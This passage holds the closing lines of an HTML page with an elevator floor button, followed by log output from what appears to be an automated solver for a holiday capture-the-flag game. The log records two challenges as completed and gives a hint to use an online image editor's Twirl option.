                      <button class="btn btnr powered" data-floor="r">R</button>
                    </div>
                  <script src="app.js"></script>
                </body>
            
2020-12-27 11:32:16.293 +00:00 [VRB] Challenge DefeatFingerprintSensor completed
2020-12-27 11:32:16.306 +00:00 [VRB] Running challange UncoverChristmasList
2020-12-27 11:32:16.307 +00:00 [INF] Open https://www.photopea.com/ and use Twirl option.
2020-12-27 11:32:16.307 +00:00 [VRB] Challenge UncoverChristmasList completed
